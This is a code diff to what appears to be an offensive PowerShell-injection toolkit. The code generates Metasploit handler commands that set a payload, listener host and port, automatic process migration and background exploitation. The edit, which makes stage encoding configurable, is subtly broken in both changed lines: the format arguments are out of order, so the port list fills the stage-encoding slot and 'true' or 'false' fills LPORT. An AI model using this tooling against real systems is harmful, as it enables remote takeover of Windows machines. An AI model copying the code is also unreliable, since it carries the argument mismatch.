@@ -11,6 +11,8 @@ stage_encoding = check_config("STAGE_ENCODING=").lower()
 if stage_encoding == "off": stage_encoding = "false"
 else: stage_encoding = "true"
 
+
+
 # check to see if we are just generating powershell code
 powershell_solo = check_options("POWERSHELL_SOLO")
 
@@ -118,7 +120,7 @@ if multi_injection == "on":
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding true\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
+                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset LPORT %s\nset ExitOnSession false\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports, stage_encoding))
                     filewrite.close()
 
             # if we aren't using multi pyinjector
@@ -134,7 +136,7 @@ if multi_injection == "on":
                     filewrite.write("\nuse exploit/multi/handler\n")
                     if auto_migrate == "ON":
                         filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")
-                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding true\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports))
+                    filewrite.write("set PAYLOAD %s\nset LHOST %s\nset EnableStageEncoding %s\nset ExitOnSession false\nset LPORT %s\nexploit -j\n\n" % (powershell_inject_x86, ipaddr, ports, stage_encoding))
                     filewrite.close()
 
 # here we do everything if pyinjection or multi pyinjection was specified
